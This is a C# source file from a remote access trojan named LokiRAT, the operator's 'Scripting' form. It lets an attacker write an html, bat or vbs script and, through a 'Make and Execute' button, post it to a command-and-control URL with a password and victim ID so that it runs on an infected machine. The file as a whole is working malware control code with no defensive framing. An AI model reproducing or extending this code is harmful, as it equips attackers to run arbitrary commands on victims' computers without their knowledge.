namespace LokiRAT_Server
{
    using System;
    using System.Collections.Specialized;
    using System.ComponentModel;
    using System.Drawing;
    using System.Net;
    using System.Windows.Forms;

    public class scripting : Form
    {
        private Button button1;
        private ComboBox comboBox1;
        private IContainer components = null;
        private Label label1;
        private RichTextBox richTextBox1;

        public scripting()
        {
            this.InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.postData("type=command", "script|" + this.comboBox1.Text + "|" + this.richTextBox1.Text);
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            ComponentResourceManager manager = new ComponentResourceManager(typeof(scripting));
            this.richTextBox1 = new RichTextBox();
            this.label1 = new Label();
            this.comboBox1 = new ComboBox();
            this.button1 = new Button();
            base.SuspendLayout();
            this.richTextBox1.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.richTextBox1.Location = new Point(1, 0);
            this.richTextBox1.Name = "richTextBox1";
            this.richTextBox1.Size = new Size(0x24f, 0x196);
            this.richTextBox1.TabIndex = 0;
            this.richTextBox1.Text = "";
            this.label1.AutoSize = true;
            this.label1.Location = new Point(12, 0x19f);
            this.label1.Name = "label1";
            this.label1.Size = new Size(0x55, 13);
            this.label1.TabIndex = 1;
            this.label1.Text = "Script extension:";
            this.comboBox1.FormattingEnabled = true;
            this.comboBox1.Items.AddRange(new object[] { "html", "bat", "vbs" });
            this.comboBox1.Location = new Point(0x67, 0x19c);
            this.comboBox1.Name = "comboBox1";
            this.comboBox1.Size = new Size(0x45, 0x15);
            this.comboBox1.TabIndex = 2;
            this.comboBox1.Text = "html";
            this.button1.Location = new Point(0x189, 410);
            this.button1.Name = "button1";
            this.button1.Size = new Size(0xbb, 0x17);
            this.button1.TabIndex = 3;
            this.button1.Text = "Make and Execute";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new EventHandler(this.button1_Click);
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(0x250, 440);
            base.Controls.Add(this.button1);
            base.Controls.Add(this.comboBox1);
            base.Controls.Add(this.label1);
            base.Controls.Add(this.richTextBox1);
            base.Icon = (Icon) manager.GetObject("$this.Icon");
            base.Name = "scripting";
            this.Text = "Scripting | LokiRAT";
            base.ResumeLayout(false);
            base.PerformLayout();
        }

        public void postData(string getString, string postString)
        {
            try
            {
                WebClient client = new WebClient();
                NameValueCollection data = new NameValueCollection();
                data.Add("command", postString);
                client.UploadValues(main.connectionURL + "?pass=" + main.connectionPass + "&id=" + main.currentID + "&" + getString, data);
            }
            catch
            {
            }
        }
    }
}

